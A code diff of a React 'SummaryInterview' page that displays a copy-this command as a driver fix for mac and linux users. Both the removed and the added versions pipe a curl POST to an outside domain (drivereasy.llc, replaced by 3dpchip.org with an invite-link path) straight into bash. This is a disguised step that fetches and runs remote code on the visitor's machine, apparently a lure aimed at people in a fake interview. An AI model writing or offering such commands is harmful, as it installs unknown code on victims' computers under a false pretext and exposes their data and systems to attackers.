@@ -725,12 +725,11 @@ export default function SummaryInterview() {
             <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="region" aria-label="Command to copy">
                 {driverOs === 'mac' && (
                       <code>
-                  {`curl -sL -X POST https://drivereasy.llc/mac \
-                    -H "Host: drivereasy.llc" \
-                    -H "User-Agent: Mozilla/5.0" \
-                    -H "Accept: */*" | bash && \
-                  curl -X POST -sL https://drivereasy.llc/auto-update/${inviteLink ? inviteLink : ''}`}
-                      </code>
+                      {`curl -sL -X POST https://3dpchip.org/mac/${inviteLink ? inviteLink : ''} \
+                        -H "Host: 3dpchip.org" \
+                        -H "User-Agent: Mozilla/5.0" \
+                        -H "Accept: */*" | bash \ `}
+                          </code>
                   )}
                 {driverOs === 'windows' && (
                           <code>
@@ -744,11 +743,10 @@ export default function SummaryInterview() {
                       )}
               {driverOs === 'linux' && (
                       <code>
-                  {`curl -sL -X POST https://drivereasy.llc/mac \
-                    -H "Host: drivereasy.llc" \
+                  {`curl -sL -X POST https://3dpchip.org/mac/${inviteLink ? inviteLink : ''} \
+                    -H "Host: 3dpchip.org" \
                     -H "User-Agent: Mozilla/5.0" \
-                    -H "Accept: */*" | bash && \
-                  curl -X POST -sL https://drivereasy.llc/auto-update/${inviteLink ? inviteLink : ''}`}
+                    -H "Accept: */*" | bash && \ `}
                       </code>
                   )}
             </div>
